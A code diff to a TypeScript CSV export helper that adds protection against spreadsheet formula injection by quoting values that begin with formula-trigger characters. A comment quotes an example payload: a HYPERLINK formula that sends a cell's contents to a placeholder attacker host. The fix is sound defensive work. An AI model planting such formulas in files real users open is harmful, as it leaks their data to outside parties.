@@ -1,8 +1,16 @@
 import { getCollections } from '@/db/client';
 
+// First-char characters Excel/LibreOffice/Numbers treat as formula trigger.
+const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);
+
 function esc(v: unknown): string {
   if (v === null || v === undefined) return '';
-  const s = String(v);
+  let s = String(v);
+  // CSV injection: prefix with a single quote so spreadsheets don't evaluate it.
+  // `=HYPERLINK("http://evil/?x="&A1,"hi")` would otherwise execute when opened.
+  if (s.length > 0 && FORMULA_TRIGGERS.has(s[0] as string)) {
+    s = `'${s}`;
+  }
   if (s.includes(',') || s.includes('"') || s.includes('\n')) {
     return `"${s.replace(/"/g, '""')}"`;
   }
